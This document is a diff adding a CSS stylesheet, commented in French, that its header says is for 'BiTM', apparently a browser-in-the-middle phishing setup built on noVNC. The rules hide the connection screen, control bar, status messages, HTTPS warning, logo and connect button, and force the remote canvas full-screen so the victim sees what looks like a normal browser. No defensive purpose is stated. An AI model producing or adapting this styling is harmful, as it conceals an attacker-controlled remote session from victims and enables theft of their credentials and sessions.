@@ -1,0 +1,52 @@
+/* === Modifications pour BiTM - Masquer l'interface noVNC === */
+
+/* Masquer l'écran de transition/connexion */
+#noVNC_transition,
+#noVNC_transition_text {
+    display: none !important;
+    opacity: 0 !important;
+    visibility: hidden !important;
+}
+
+/* Masquer la barre de contrôle */
+#noVNC_control_bar {
+    display: none !important;
+}
+
+/* Masquer tous les messages de statut */
+#noVNC_status,
+.noVNC_status {
+    display: none !important;
+}
+
+/* Masquer l'avertissement HTTPS */
+.noVNC_alert {
+    display: none !important;
+}
+
+/* Masquer le logo noVNC */
+#noVNC_logo {
+    display: none !important;
+}
+
+/* Masquer le bouton de connexion */
+#noVNC_connect_button {
+    display: none !important;
+}
+
+/* Forcer le conteneur VNC à prendre tout l'écran immédiatement */
+#noVNC_container {
+    position: fixed !important;
+    top: 0 !important;
+    left: 0 !important;
+    width: 100% !important;
+    height: 100% !important;
+    background-color: #000 !important;
+}
+
+/* Afficher le canvas VNC immédiatement */
+#noVNC_screen {
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+}
